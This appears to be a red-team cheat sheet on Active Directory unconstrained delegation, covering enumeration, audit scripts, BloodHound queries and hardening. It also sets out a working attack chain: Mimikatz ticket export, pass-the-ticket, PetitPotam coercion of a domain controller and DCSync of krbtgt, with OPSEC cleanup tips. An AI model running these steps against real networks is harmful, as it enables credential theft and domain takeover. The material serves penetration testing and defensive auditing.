---
aliases:
  - Unconstrained Delegation
  - TRUSTED_FOR_DELEGATION
  - UD Discovery
  - UD Enumeration
tags:
  - type/cheatsheet
  - vuln/ad-enumeration
  - technique/discovery
  - asset/active-directory
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - "[[AD - Delegation Enumeration]]"
  - "[[Unconstrained Delegation]]"
---
# AD - Delegation Enumeration - Unconstrained Delegation

***

## Concept Overview

| **Concepto** | **Detalle** | **Notas** |
|:---:|:---:|:---:|
| Unconstrained Delegation (UD) | User TGT cached on host LSASS | Critical risk. |
| `userAccountControl` flag | TRUSTED_FOR_DELEGATION (0x80000) | Bitfield. |
| Computer with UD | Caches TGT of users authenticating | Standard. |
| User with UD (rare) | Caches TGT in user context | Edge. |
| TGT cached after auth to UD host | Auto | Standard. |
| Atacante with admin on UD host = capture TGTs | Direct | Standard. |
| Mimikatz `sekurlsa::tickets /export` | Tool | Adjacent. |
| Capture DA TGT if DA logs to UD host | Critical chain | Critical. |
| Coercion + UD = forced TGT capture | Standard chain | Standard. |
| Modern Microsoft mitigation | Limited (legacy default) | Adjacent. |
| Domain Controllers always UD | By design | Standard. |
| Default DCs UD | Required for DC operations | Standard. |
| Modern: minimize non-DC UD hosts | Best practice | Standard. |
| Detection: UD usage events | Defender | Adjacent. |
| Adjacent: Delegation Abuse hub | Cross-ref | Adjacent. |
| Adjacent: Authentication Coercion hub | Cross-ref | Adjacent. |
^ad-ud-concept

### UD discovery via UAC flag

```bash
# UAC bit 0x80000 (524288) = TRUSTED_FOR_DELEGATION

# Computers with UD
ldapsearch -h DC -D 'dom\u' -w pass -b "DC=dom,DC=local" \
  "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" \
  cn dNSHostName operatingSystem

# Users with UD (rare)
ldapsearch -h DC -D 'dom\u' -w pass -b "DC=dom,DC=local" \
  "(&(objectCategory=user)(!(objectClass=computer))(userAccountControl:1.2.840.113556.1.4.803:=524288))" \
  samAccountName

# netexec
nxc ldap DC -u user -p pass --trusted-for-delegation
```

___

## Computer Objects with UD

| **Comando** | **Output** | **Notas** |
|:---:|:---:|:---:|
| `Get-ADComputer -Filter {TrustedForDelegation -eq $true}` | RSAT direct | Standard. |
| `Get-ADComputer -Filter {TrustedForDelegation -eq $true -and PrimaryGroupID -ne 516}` | Exclude DCs | Critical filter. |
| LDAP UAC bit filter | 524288 | Direct. |
| `nxc ldap DC --trusted-for-delegation` | netexec | Standard. |
| `Get-NetComputer -Unconstrained` (PowerView) | Adversary tool | Adjacent. |
| `Get-DomainComputer -Unconstrained` (PowerView v3) | Adjacent | Adjacent. |
| BloodHound `AllowedToDelegate` adjacent | Tool | Adjacent. |
| BHCE 5.x+ UD nodes | Modern | Tool. |
| `Get-ADComputer -Filter * -Properties TrustedForDelegation` | Bulk | Standard. |
| Exclude DC OU (PrimaryGroupID 516) | Standard | Audit. |
| Cross-correlate with priv computer | Tier 0 | Audit. |
| Detection: bulk UD enumeration | Defender | Adjacent. |
| Audit: minimize non-DC UD | Best practice | Standard. |
| Modern: deprecated for non-DCs | Hardening | Standard. |
| Compliance: documented UD baseline | Standard | Adjacent. |
| Adjacent: Hosts Enumeration hub | Cross-ref | Adjacent. |
^ad-ud-computers

### Computer UD discovery

```powershell
# All computers with UD (excluding DCs)
Get-ADComputer -Filter {TrustedForDelegation -eq $true -and PrimaryGroupID -ne 516} `
  -Properties TrustedForDelegation,LastLogonDate,OperatingSystem |
  Select Name,DNSHostName,OperatingSystem,LastLogonDate

# DCs (default UD - ignore)
Get-ADComputer -Filter {PrimaryGroupID -eq 516} -Properties TrustedForDelegation |
  Select Name,TrustedForDelegation
```

```bash
# netexec
nxc ldap DC -u user -p pass --trusted-for-delegation

# Linux pywerview
pywerview get-netcomputer -u user -p pass -d dom.local --dc-ip DC --unconstrained
```

___

## User Objects with UD (Rare)

| **Concepto** | **Detalle** | **Notas** |
|:---:|:---:|:---:|
| User with UD = TGT cached in user context | Edge | Edge. |
| Less common than computer UD | Rare | Edge. |
| Service accounts sometimes have UD | Edge misconfig | Audit. |
| LDAP UAC bit filter | 524288 | Direct. |
| Cross-correlate with priv | Standard | Audit. |
| Detection: user UD events | Defender | Adjacent. |
| Modern hardening: never user UD | Best practice | Standard. |
| Audit: minimize/remove user UD | Standard | Compliance. |
| Stale user UD | Old delegation | Audit. |
| BloodHound user UD nodes | Modern | Tool. |
| Adjacent: BloodHound hub | Cross-ref | Adjacent. |
| Cross-trust user UD | Edge | Edge. |
| Compliance: documented baseline | Standard | Adjacent. |
| Cleanup post-engagement | Standard | OPSEC. |
| Modern: extreme audit user UD | Best practice | Standard. |
| Foreign user UD (cross-trust) | Critical | Critical. |
^ad-ud-users

### User UD discovery

```powershell
# Users with UD
Get-ADUser -Filter {TrustedForDelegation -eq $true} `
  -Properties TrustedForDelegation,Enabled,LastLogonDate,MemberOf |
  Select Name,SamAccountName,Enabled,LastLogonDate,MemberOf

# Cross-correlate with priv (CRITICAL)
Get-ADUser -Filter {TrustedForDelegation -eq $true -and AdminCount -eq 1}
```

```bash
# LDAP raw
ldapsearch -h DC -D 'dom\u' -w pass -b "DC=dom,DC=local" \
  "(&(objectCategory=user)(!(objectClass=computer))(userAccountControl:1.2.840.113556.1.4.803:=524288))" \
  samAccountName memberOf
```

___

## TGT Capture Workflow

| **Step** | **Comando** | **Notas** |
|:---:|:---:|:---:|
| 1. Compromise UD host | Standard chain | Standard. |
| 2. Local admin / SYSTEM context | Required | Standard. |
| 3. Mimikatz sekurlsa::tickets /export | Export TGTs | Tool. |
| 4. Filter for high-priv TGTs | DA, EA, etc. | Filter. |
| 5. Use TGT (Pass-the-Ticket) | `Rubeus ptt` | Adjacent. |
| Coercion + UD = forced TGT | Combine with PetitPotam etc. | Standard. |
| Wait for users to auth | Passive | Standard. |
| Modern: 24x7 monitoring | Defender | Adjacent. |
| Detection: TGT export events | Defender | Adjacent. |
| OPSEC: stealth ticket export | Edge | OPSEC. |
| Cleanup: clear ticket cache | Standard | OPSEC. |
| Adjacent: Pass-the-Ticket hub | Cross-ref | Adjacent. |
| Adjacent: Coercion hub | Cross-ref | Adjacent. |
| Cross-correlate user logon events | Defender | Adjacent. |
| Compliance: minimize UD | Best practice | Standard. |
| Modern: Defender for Identity UD alerts | Modern | Defender. |
^ad-ud-workflow

### TGT capture chain

```cmd
:: After compromising UD host (local admin / SYSTEM)
:: Mimikatz
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export

:: Files saved: [user]@krbtgt-DOM.LOCAL.kirbi
:: Filter for high-priv: DA users, EA, service accounts

:: Use TGT (Pass-the-Ticket)
mimikatz # kerberos::ptt 0;abc123_administrator@krbtgt-DOM.LOCAL.kirbi

:: Verify
klist

:: Or Rubeus
Rubeus.exe dump
Rubeus.exe ptt /ticket:base64
```

```bash
# Linux equivalent (after compromise)
# Use Rubeus with WSL, or:
# pypykatz from memory dump
pypykatz lsa minidump lsass.dmp

# Then parse + use TGTs
```

___

## Coercion + UD Chain

| **Coercion** | **Trigger** | **Notas** |
|:---:|:---:|:---:|
| PetitPotam | EFS RPC | Standard. |
| PrinterBug | SpoolSubsystem | Standard. |
| DFSCoerce | DFS RPC | Modern. |
| ShadowCoerce | FileSystem RPC | Modern. |
| `coerce` MS-RPRN | Print spooler | Standard. |
| Any RPC coercion | Force DC auth | Standard. |
| DC auth to UD host = TGT cache | Standard chain | Standard. |
| Combine with NTLM Relay alternative | UD = capture, Relay = use | Adjacent. |
| `Trusted For Delegation` = TGT cache | Auto | Standard. |
| Adjacent: Coercion hub | Cross-ref | Adjacent. |
| Adjacent: NTLM Relay hub | Cross-ref | Adjacent. |
| Detection: coercion + replication | Defender | Adjacent. |
| Modern: post-patch limits some coercion | Standard | Adjacent. |
| OPSEC: coercion is loud | Adjacent | OPSEC. |
| Cleanup: nothing (passive coercion) | Standard | OPSEC. |
| Compliance: per-RPC patch status | Standard | Adjacent. |
^ad-ud-coercion

### Coercion + UD chain

```bash
# Step 1: Set up UD host (compromised)
# Step 2: Coerce DC to auth to UD host
# Example: PetitPotam
python3 PetitPotam.py UD_HOST_IP DC_IP

# DC auths to UD host with computer account TGT
# TGT cached in LSASS of UD host

# Step 3: Mimikatz on UD host extracts DC TGT
mimikatz # sekurlsa::tickets /export

# Step 4: Use DC$ TGT for DCSync (Pass-the-Ticket)
mimikatz # kerberos::ptt 0;abc_DC$@krbtgt-DOM.LOCAL.kirbi
mimikatz # lsadump::dcsync /domain:dom.local /user:krbtgt
```

___

## Domain Controllers (Default UD)

| **Concepto** | **Detalle** | **Notas** |
|:---:|:---:|:---:|
| All DCs have UD by default | Required for operations | Standard. |
| LSASS contains DA TGTs by design | Standard | Standard. |
| DC compromise = full domain | Adjacent | Standard. |
| Mimikatz on DC = TGT export | Standard | Standard. |
| Filter UD hosts for non-DCs | Audit critical | Standard. |
| `PrimaryGroupID = 516` | Domain Controllers RID | Filter. |
| Modern: DC tier isolation | Best practice | Standard. |
| RODC has UD too (filtered) | Edge | Adjacent. |
| Detection: DC LSASS dump | Defender | Adjacent. |
| Modern: Credential Guard on DCs | Hardening | Standard. |
| Audit log: DC LSASS access | Standard | Adjacent. |
| Compliance: DCs Tier 0 | Standard | Adjacent. |
| Adjacent: LSASS Dumping hub | Cross-ref | Adjacent. |
| OPSEC: DC dumps are critical events | Defender | OPSEC. |
| Modern: Defender for Identity DC monitoring | Modern | Defender. |
| Cleanup: DC dumps detected | Standard | Adjacent. |
^ad-ud-dcs

### DC UD context

```powershell
# Filter DCs out from UD audit
Get-ADComputer -Filter {TrustedForDelegation -eq $true -and PrimaryGroupID -ne 516} `
  -Properties TrustedForDelegation |
  Select Name,DNSHostName,OperatingSystem
# Output: NON-DC computers with UD = audit risk
```

___

## Cross-Correlate with Priv Tier

| **Pattern** | **Detection** | **Notas** |
|:---:|:---:|:---:|
| UD on Tier 0 server | Critical (only DCs should be UD) | Critical. |
| UD on Tier 1 server | Common misconfig | Audit. |
| UD on Tier 2 workstation | Edge anomaly | Investigate. |
| Service account UD | Edge | Audit. |
| User UD (rare) | Audit | Standard. |
| Cross-trust UD | Cross-forest | Critical. |
| Stale UD on decommissioned host | Audit | Standard. |
| Computer in DA + UD | Critical | Critical. |
| BloodHound UD nodes + priv | Modern | Tool. |
| Cypher: paths via UD | Custom | Tool. |
| Detection: UD enable events | Defender | Adjacent. |
| Modern: continuous monitoring | Defender | Standard. |
| Audit: per-quarter UD review | Standard | Compliance. |
| Compliance: minimize UD non-DC | Best practice | Standard. |
| Cleanup: remove unnecessary UD | Hygiene | Standard. |
| Adjacent: Tier model isolation | Standard | Adjacent. |
^ad-ud-tier

### Tier audit script

```powershell
# All UD hosts (non-DC) with their tier classification
Get-ADComputer -Filter {TrustedForDelegation -eq $true -and PrimaryGroupID -ne 516} `
  -Properties OperatingSystem,DistinguishedName,LastLogonDate |
  ForEach-Object {
    $tier = if ($_.DistinguishedName -match "Tier 0") {"Tier 0"}
            elseif ($_.OperatingSystem -match "Server") {"Tier 1"}
            else {"Tier 2"}
    
    [PSCustomObject]@{
      Computer = $_.Name
      DN = $_.DistinguishedName
      OS = $_.OperatingSystem
      Tier = $tier
      LastLogon = $_.LastLogonDate
    }
  } | Sort Tier
```

___

## BloodHound UD Visualization

| **Edge** | **Significado** | **Notas** |
|:---:|:---:|:---:|
| `AllowedToDelegate` | Constrained delegation (different from UD) | Adjacent. |
| UD via UAC flag (computer property) | `unconstraineddelegation: true` | Standard. |
| Cypher: filter UD computers | `WHERE c.unconstraineddelegation = true` | Standard. |
| Visual: UD computer node highlighted | Standard | Tool. |
| Cross-correlate priv users logging here | Standard | Tool. |
| Path analysis | Custom | Tool. |
| BHCE 5.x+ UD support | Modern | Tool. |
| Per-domain ingest | Multi-domain | Adjacent. |
| Detection: BloodHound collection events | Defender | Adjacent. |
| Modern BHCE 6.x improved | Standard | Tool. |
| Cypher: paths via UD computer | Custom | Standard. |
| Compliance baseline queries | Standard | Adjacent. |
| Cross-correlate with sessions edge | Modern | Tool. |
| Adjacent: BloodHound hub | Cross-ref | Adjacent. |
| Compliance: continuous BHCE | Modern | Standard. |
| Custom analytics scripts | DIY | Tool. |
^ad-ud-bh

### BloodHound UD queries

```cypher
// All computers with UD (non-DC)
MATCH (c:Computer {unconstraineddelegation: true})
WHERE NOT c.distinguishedname CONTAINS "OU=Domain Controllers"
RETURN c.name, c.operatingsystem

// UD computers with active priv user sessions
MATCH (c:Computer {unconstraineddelegation: true})-[:HasSession]->(u:User)
WHERE u.adminCount = true
RETURN c.name, u.name

// Path: owned → UD computer → DA via session
MATCH (owned {owned: true}), (c:Computer {unconstraineddelegation: true}),
      (da:Group {name: "DOMAIN ADMINS@DOM.LOCAL"})
MATCH p1=shortestPath((owned)-[*1..]->(c))
MATCH (c)-[:HasSession]->(u:User)
MATCH p2=shortestPath((u)-[:MemberOf*1..]->(da))
RETURN p1, p2
```

___

## Mitigations & Hardening

| **Mitigation** | **Detail** | **Notas** |
|:---:|:---:|:---:|
| Remove non-DC UD | Best practice | Standard. |
| `Account is sensitive and cannot be delegated` UAC bit | Tier 0 user setting | Hardening. |
| Add Tier 0 to Protected Users group | Modern | Hardening. |
| Configure constrained delegation instead | Granular | Hardening. |
| Modern: Resource-Based Constrained (RBCD) preferred | Standard | Hardening. |
| Per-quarter UD audit | Standard | Compliance. |
| Detection: TGT cache anomaly | Defender | Adjacent. |
| Microsoft Defender for Identity UD alerts | Modern | Defender. |
| Credential Guard on DCs | Hardening | Standard. |
| Disable RC4 in Kerberos | Adjacent hardening | Standard. |
| AES-only Kerberos | Modern | Hardening. |
| Network: limit UD host network access | Hardening | Standard. |
| Audit: documented UD justification | Standard | Compliance. |
| Cleanup: stale UD hosts | Hygiene | Standard. |
| Modern: Tier 0 isolation | Best practice | Standard. |
| Adjacent: Coercion patches | Standard | Adjacent. |
^ad-ud-mitigations

### Hardening commands

```powershell
# Add Tier 0 admins to Protected Users group
Add-ADGroupMember -Identity "Protected Users" -Members "DA-User1","DA-User2"

# Mark Tier 0 user as sensitive (UAC bit)
Set-ADAccountControl -Identity "DA-User1" -AccountNotDelegated $true

# Remove UD from non-DC computer
Set-ADAccountControl -Identity "Server01$" -TrustedForDelegation $false

# Audit + remove all non-DC UD
Get-ADComputer -Filter {TrustedForDelegation -eq $true -and PrimaryGroupID -ne 516} |
  ForEach-Object {
    Write-Warning "Disabling UD on $($_.Name)"
    Set-ADAccountControl -Identity $_ -TrustedForDelegation $false
  }
```

***
